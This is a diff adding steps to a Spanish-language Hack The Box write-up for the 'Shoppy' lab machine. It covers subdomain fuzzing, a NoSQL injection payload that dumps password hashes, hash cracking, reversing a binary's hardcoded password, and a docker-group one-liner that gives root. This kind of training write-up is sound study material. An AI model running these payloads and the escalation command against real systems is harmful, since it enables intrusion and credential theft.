@@ -175,6 +175,29 @@ http://shoppy.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.23.1
 
 Deberemos añadir el dominio `shoppy.htb` a `/etc/hosts`.
 
+### VHOST
+
+Vemos que se está aplicando **Virtual Hosting**, vamos a ver que otros subdominios encontramos:
+
+```bash wrap=false
+❯ wfuzz -c -H "Host: FUZZ.shoppy.htb" --hc 301 -t 200 -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt http://shoppy.htb 
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://shoppy.htb/
+Total requests: 100000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                               
+=====================================================================
+
+000047340:   200        0 L      141 W      3122 Ch     "mattermost"   
+```
+
+Nos lo vamos a añadir y lo tendremos en cuenta próximamente.
+
 ### Wfuzz
 
 Para ver archivos/directorios ocultos dentro de la web objetivo, usaremos `wfuzz` para realizar fuerza bruta:
@@ -221,6 +244,170 @@ Set-Cookie: connect.sid=s%3AV4NRfeadzMU2OKTgpJu5jW2oK8xqKdv5.SOLmiusky7RmyjLwsez
 
 ![Login bypass](./2.png)
 
-// PWNED
+Ya nos hemos saltado la autenticación, vemos que hay una especie de buscador, que si probamos el mimsmo exploit `http://shoppy.htb/admin/search-users?username=' || '1'=='1`:
+
+![Search bypass](./3.png)
+
+Si le damos click al botón vemos esto:
+
+```json wrap=false
+[{"_id":"62db0e93d6d6a999a66ee67a","username":"admin","password":"23c6877d9e2b564ef8b32c3a23de27b2"},{"_id":"62db0e93d6d6a999a66ee67b","username":"josh","password":"6ebcea65320589ca4f2f1ce039975995"}]
+```
+
+### Cracking Hashes
+
+Si intentamos crackear estos hashes en [cracakstation.net](https://crackstation.net/), vemos que el de `josh` es:
+
+![Cracking hashes](./4.png)
+
+Probando estas credenciales, vemos que sirven en `mattermost.shoppy.htb`:
+
+![Mattermost login](./5.png)
+
+Investigando las conversaciones, vemos algo bastante interesante:
+
+![Information leakage](./6.png)
+
+```bash wrap=false intitle='Nos conectamos por SSH'
+❯ ssh jaeger@10.10.11.180
+jaeger@10.10.11.180's password: 
+Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Mon Oct 20 13:01:46 2025 from 10.10.14.7
+jaeger@shoppy:~$ whoami
+jaeger
+jaeger@shoppy:~$ cat user.txt 
+fb1a370f2fca17d7c65...
+```
+
+## Escalada de privilegios
+
+Vamos a ver si tenemos algún privilegio como usuario `jaeger`:
+
+```bash wrap=false
+jaeger@shoppy:~$ sudo -l
+Matching Defaults entries for jaeger on shoppy:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User jaeger may run the following commands on shoppy:
+    (deploy) /home/deploy/password-manager
+```
+
+Vemos que podemos ejecutar el binario `/home/deploy/password-manager` como el usuario `deploy`, vamos a probar a ver que hace este binario:
+
+```bash wrap=false
+jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
+Welcome to Josh password manager!
+Please enter your master password: Sh0ppyBest@pp!
+Access denied! This incident will be reported !
+```
+
+### Ghidra
+
+Si lo pasamos por `Ghidra` para hacer ingenieria inversa, vemos este código:
+
+```bash wrap=false
+
+bool main(void)
+
+{
+  int comparacion_resultado;
+  ostream *poVar1;
+  string correct_password [32];
+  string input_password [47];
+  allocator local_19 [9];
+  
+  poVar1 = std::operator<<((ostream *)std::cout,"Welcome to Josh password manager!");
+  std::ostream::operator<<(poVar1,std::endl<>);
+  std::operator<<((ostream *)std::cout,"Please enter your master password: ");
+  std::__cxx11::string::string(input_password);
+                    /* try { // try from 00101263 to 00101267 has its CatchHandler @ 001013cb */
+  std::operator>>((istream *)std::cin,input_password);
+  std::allocator<char>::allocator();
+                    /* try { // try from 00101286 to 0010128a has its CatchHandler @ 001013a9 */
+  std::__cxx11::string::string(correct_password,"",local_19);
+  std::allocator<char>::~allocator((allocator<char> *)local_19);
+                    /* try { // try from 001012a5 to 00101387 has its CatchHandler @ 001013ba */
+  std::__cxx11::string::operator+=(correct_password,"S");
+  std::__cxx11::string::operator+=(correct_password,"a");
+  std::__cxx11::string::operator+=(correct_password,"m");
+  std::__cxx11::string::operator+=(correct_password,"p");
+  std::__cxx11::string::operator+=(correct_password,"l");
+  std::__cxx11::string::operator+=(correct_password,"e");
+  comparacion_resultado = std::__cxx11::string::compare(input_password);
+  if (comparacion_resultado != 0) {
+    poVar1 = std::operator<<((ostream *)std::cout,"Access denied! This incident will be reported !")
+    ;
+    std::ostream::operator<<(poVar1,std::endl<>);
+  }
+  else {
+    poVar1 = std::operator<<((ostream *)std::cout,"Access granted! Here is creds !");
+    std::ostream::operator<<(poVar1,std::endl<>);
+    system("cat /home/deploy/creds.txt");
+  }
+  std::__cxx11::string::~string(correct_password);
+  std::__cxx11::string::~string(input_password);
+  return comparacion_resultado != 0;
+}
+```
+
+Básicamente lee nuestro input, y lo compara con `Sample` que es la contraseña:
+
+```bash wrap=false
+jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
+Welcome to Josh password manager!
+Please enter your master password: Sample
+Access granted! Here is creds !
+Deploy Creds :
+username: deploy
+password: Deploying@pp!
+jaeger@shoppy:~$ su deploy
+Password: 
+$ whoami
+deploy
+$ id
+uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
+```
+
+### Docker group abuse
+
+Debido a que pertenecemos al grupo `docker`, vamos a empezar haciendo un reconocimiento en la máquina:
+
+```bash wrap=false
+deploy@shoppy:~$ docker ps
+CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
+deploy@shoppy:~$ docker images
+REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
+alpine       latest    d7d3d98c851f   3 years ago   5.53MB
+```
+
+Viendo que tiene la imagen de **alpine** se me ocurre ejecutar esto:
+
+```bash wrap=false
+docker run --rm -it -v /:/mnt alpine chroot /mnt sh
+```
+
+`docker run` → Crea y ejecuta un contenedor
+`--rm` → Elimina el contenedor al salir 
+`-it` → Shell interactiva en el contenedor
+`-v /:/mnt` → Monta el filesystem completo del host en /mnt del contenedor
+`alpine` → Imagen Linux
+`chroot /mnt sh` → Cambia el root al filesystem del host, obteniendo shell como root
+
+```bash wrap=false
+deploy@shoppy:~$ docker run --rm -it -v /:/mnt alpine chroot /mnt sh
+# whoami
+root
+# cat /root/root.txt
+3cb46d87fba67dbd77f0...
+```
+
+[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/496)
 
 ---
